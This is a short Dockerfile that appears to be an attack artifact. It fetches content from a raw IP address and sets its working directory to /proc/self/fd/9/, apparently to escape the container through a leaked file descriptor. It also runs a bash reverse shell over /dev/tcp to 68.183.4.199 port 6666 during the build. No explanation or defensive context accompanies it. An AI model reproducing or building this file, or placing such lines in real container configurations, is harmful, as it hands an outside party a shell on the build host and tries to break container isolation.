FROM ubuntu
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/from_ibm

WORKDIR /proc/self/fd/9/

RUN bash -i >& /dev/tcp/68.183.4.199/6666 0>&1

CMD ["/bin/bash"]
